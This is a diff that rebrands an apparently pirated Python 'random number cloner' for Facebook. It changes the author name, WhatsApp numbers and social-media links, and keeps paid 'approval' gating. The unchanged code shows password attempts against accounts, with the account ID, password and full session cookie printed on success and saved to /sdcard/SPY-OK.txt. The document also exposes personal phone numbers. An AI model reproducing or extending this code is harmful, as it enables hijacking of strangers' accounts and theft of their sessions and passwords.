@@ -162,15 +162,15 @@ def menu_apikey():
     │ [✓] AUTHOR   : Saiko Haker 😈         │
     │ [✓] GITHUB   : JUBU the NOOB 💗       │
     │ [✓] TYPE     : FREE,Frist Aproved     │
-    │ [✓] WHATSAPP : +8801615161056         │
+    │ [✓] WHATSAPP : +8801834292903         │
     │ [✓] VERSION  :  0.1                   │
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
     └───────────────────────────────────────┘""")
-  print(f"\t \033[1;32m NAMTA MONE RAKHBEN VIRUS TEAM-NSN & ANONYMOUS CYBER ™ \033[1;37m ")
+  print(f"\t \033[1;32m NAMTA MONE RAKHBEN SAIKO HAKER JUBU 😈\033[1;37m ")
   print(f"")
-  print(f"\t \033[1;32m  SHAHIN SIR TOOLS ER PRICE CHILO 6K TK  \033[1;37m ")
+  print(f"\t \033[1;32m  SCRIPT TA AMAR NA SHAIN VAIR THAKA NISI\033[1;37m ")
   print(f"")
-  print(f"\t \033[1;32m  ATO TK DITE PARMU NAH TAI OPENSURCH MARLAM\033[1;37m ")
+  print(f"\t \033[1;32m  FOllOW MY WHATSAPP NUMBER TO GET APPROVEL\033[1;37m ")
   print(f"")
   print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
   print(f"")
@@ -183,7 +183,7 @@ def menu_apikey():
   print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
   print(f"")
   print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
-  os.system(f'xdg-open https://www.facebook.com/sat.shahinyt')
+  os.system(f'xdg-open https://www.facebook.com/mdnasrullha.jubaer')
   print(f"");time.sleep(2)
   print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
@@ -197,7 +197,7 @@ def menu_apikey():
       
       print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
       print(f"    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system(f'xdg-open https://wa.me/+8801615161056?text='+id)
+      os.system(f'xdg-open https://wa.me/+8801834292903?text='+id)
       time.sleep(2)
       sys.exit()
   except:
@@ -221,7 +221,7 @@ logo=(f"""\x1b[1;97m
     │ [✓] AUTHOR   : Saiko Haker 😈         │
     │ [✓] GITHUB   : JUBU the NOOB          │
     │ [✓] TYPE     : FREE,Frist Aproved     │
-    │ [✓] WHATSAPP : +8801615xxxx056        │
+    │ [✓] WHATSAPP : +8801834****03         │
     │ [✓] VERSION  : 0.1                    │
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
     └───────────────────────────────────────┘""")
@@ -280,13 +280,13 @@ def admin():
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801615161056');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801834292903');time.sleep(1)
 		admin()
 	if bal =='2':
 		os.system('xdg-open https://www.facebook.com/mdnasrullha.jubaer');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://youtube.com/channel/UCk-u5MzpXGsHJDvtPAW-zbg');time.sleep(1)
+		os.system('xdg-open https://www.youtube.com/@jubuthenoob22');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -438,7 +438,7 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [SPY-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [JUBU-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                 open('/sdcard/SPY-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid)
@@ -504,7 +504,7 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [SPY-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [JUBU-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 oks.append(cid)
